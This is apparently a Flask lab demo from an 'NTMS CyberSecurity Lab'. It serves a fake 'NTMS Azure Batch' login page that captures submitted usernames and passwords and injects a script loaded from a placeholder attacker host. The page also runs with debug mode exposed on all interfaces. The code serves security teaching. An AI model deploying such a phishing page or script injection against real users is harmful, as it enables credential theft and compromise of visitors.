# Use http://webvm IP/

from flask import Flask, request, redirect, url_for, render_template_string

app = Flask(__name__)

xss_payload = '<script src="http://Attacker VM Public IP/badjs/bad.js"></script>'

html_template = """
<html>
<head>
    <title>XSS Demo - Login</title>
    <style>
        body {
            background: linear-gradient(to right, #1f4037, #99f2c8);
            font-family: Arial, sans-serif;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .disclaimer {
            position: absolute;
            top: 0;
            width: 100%;
            background-color: #ff4d4d;
            color: white;
            padding: 10px 0;
            text-align: center;
            font-weight: bold;
            z-index: 1000;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .container {
            background: #fff;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            width: 350px;
            text-align: center;
            margin-top: 80px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
        }
        input[type="submit"] {
            background-color: #1f4037;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background-color: #14532d;
        }
    </style>
</head>
<body>
    <div class="disclaimer">
        ⚠️ NTMS CyberSecurity Lab: This is a simulated XSS testing environment. Do NOT enter real credentials. Malicious scripts may run on this page.
    </div>

    <div class="container">
        <h2>NTMS Azure Batch - Login</h2>
        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Log In">
        </form>
    </div>

    {{ xss_payload|safe }}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print(f"Captured credentials: username={username}, password={password}")
        return redirect(url_for("index"))

    return render_template_string(html_template, xss_payload=xss_payload)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
